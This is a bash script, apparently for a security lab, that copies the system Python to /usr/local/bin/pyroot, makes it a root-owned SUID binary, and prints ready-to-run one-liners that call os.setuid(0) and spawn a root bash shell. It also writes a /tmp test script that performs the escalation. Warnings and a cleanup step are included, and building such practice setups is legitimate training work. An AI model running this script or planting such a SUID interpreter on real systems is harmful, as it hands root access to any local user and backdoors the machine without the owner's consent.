#!/bin/bash

# Privilege Escalation Vulnerability Setup Script
# Creates a SUID Python binary for educational testing

echo "=== Setting up Privilege Escalation Vulnerability ==="
echo "WARNING: This creates a serious security vulnerability!"
echo "Only run this on isolated test systems!"
echo

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "ERROR: This script must be run as root to set SUID permissions"
    echo "Usage: sudo $0"
    exit 1
fi

# Find Python binary
PYTHON_BIN=""
if [ -f "/usr/bin/python3" ]; then
    PYTHON_BIN="/usr/bin/python3"
elif [ -f "/usr/bin/python" ]; then
    PYTHON_BIN="/usr/bin/python"
else
    echo "ERROR: Python binary not found in /usr/bin/"
    exit 1
fi

echo "Found Python binary: $PYTHON_BIN"

# Create the vulnerable binary
VULN_BIN="/usr/local/bin/pyroot"

echo "Copying $PYTHON_BIN to $VULN_BIN..."
cp "$PYTHON_BIN" "$VULN_BIN"

echo "Setting ownership to root:root..."
chown root:root "$VULN_BIN"

echo "Setting SUID bit..."
chmod u+s "$VULN_BIN"

# Verify the setup
echo
echo "=== Vulnerability Setup Complete ==="
ls -la "$VULN_BIN"

echo
echo "=== EXPLOITATION INSTRUCTIONS ==="
echo "A low-privilege user can now escalate to root using:"
echo
echo "Method 1 - Direct shell:"
echo "$VULN_BIN -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
echo
echo "Method 2 - Execute commands as root:"
echo "$VULN_BIN -c 'import os; os.setuid(0); os.system(\"whoami\")'"
echo
echo "Method 3 - Spawn root shell with environment:"
echo "$VULN_BIN -c 'import os; os.setuid(0); os.setgid(0); os.system(\"/bin/bash -p\")'"
echo

echo "=== TESTING THE VULNERABILITY ==="
echo "To test as a non-root user:"
echo "1. Switch to a regular user account: su - normaluser"
echo "2. Run the exploitation command above"
echo "3. You should get a root shell despite starting as a normal user"
echo

echo "=== CLEANUP ==="
echo "To remove this vulnerability later, run:"
echo "sudo rm $VULN_BIN"
echo

# Create a test script for demonstration
cat > /tmp/test_privesc.sh << 'EOF'
#!/bin/bash
echo "=== Testing Privilege Escalation ==="
echo "Current user: $(whoami)"
echo "Current UID/GID: $(id)"
echo
echo "Attempting privilege escalation..."
/usr/local/bin/pyroot -c 'import os; os.setuid(0); print("Escalated to UID:", os.getuid()); os.system("whoami")'
EOF

chmod +x /tmp/test_privesc.sh
echo "Created test script at /tmp/test_privesc.sh"
echo "Run this as a normal user to test the vulnerability"

echo
echo "=== SECURITY WARNING ==="
echo "This setup creates a critical security vulnerability!"
echo "- Any user can gain root access"
echo "- Only use on isolated test systems"
echo "- Remove the SUID binary when testing is complete"
echo "- Never deploy this on production systems"
